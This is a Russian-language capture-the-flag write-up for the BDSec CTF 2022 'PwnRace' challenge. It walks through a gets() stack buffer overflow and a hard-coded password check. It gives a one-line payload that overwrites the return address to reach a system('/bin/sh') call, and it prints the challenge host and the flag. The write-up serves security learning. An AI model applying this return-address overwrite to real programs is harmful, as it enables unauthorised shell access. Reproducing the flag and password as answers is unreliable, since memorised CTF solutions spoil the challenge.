# PwnRace
Category: pwn

Score: 200 (solved by 52 teams)

nc 159.223.101.241 31337


# Introduction

Дана [программа](https://github.com/silver12-A/Writeups/blob/main/CTF_2022/BDSec_CTF_2022/pwn/PwnRace/pwnrace).

При анализе в IDA PRO видно, что необходимо выполнить переполнение буфера и перетереть адресс возврата на функцию `shell()`, где будет выполнен системный вызов `return system("/bin/sh");`

# Analyzing IDA PRO

Из `main()` вызывается функция `heath_check()`

```
int heath_check()
{
  char s1[256]; // [rsp+0h] [rbp-100h] BYREF

  printf("\x1B[0;32mEnter Password:\n\x1B[0m");
  gets(s1);
  if ( strcmp(s1, "hAcK_Th3_Pl@n3t") )
  {
    printf("\x1B[41mWrong Password!!!!\n\x1B[0m");
    _exit(0);
  }
  printf("\x1B[4;32mEnter Password:\n\x1B[0m");
  return system("top -b -n 1");
}
```

# Solver:

Функция `shell()` находится по адресу `0x4013A0`, но в данном случае эксплойт не отработает. Я часто встречаюсь с такими ошибками на ctf, но если взять адрес, где указатель на строку помещается в регистр, а именно `0x4013A8`, то все получится!!!

```
.text:00000000004013A8                 lea     rax, command    ; "/bin/sh"
.text:00000000004013AF                 mov     rdi, rax        ; command
.text:00000000004013B2                 call    _system
```
Т.к. функция `gets(s1);` уязвима, мы можем перетереть массив `s1[256]`, тем самым перетереть `rsp` и адресс возврата `ret`. Но еще необходимо , чтобы s1 была равна hAcK_Th3_Pl@n3t. Это можно сделать так:

Воспользуемся пакетом python3 pwn-tools 
```
exploit=b'hAcK_Th3_Pl@n3t\x00'+b'a'*248+p64(0x4013A8)

```

# Solution script
Сценарий реализации эксплойта можно найти [здесь](https://github.com/silver12-A/Writeups/blob/main/CTF_2022/BDSec_CTF_2022/pwn/PwnRace/solver.py).


![pwn](https://user-images.githubusercontent.com/55994705/180290992-0980d087-3190-4a3b-8124-938fb454a78a.PNG)

# флаг: 
BDSEC{pwn_is_the_way_to_haven}
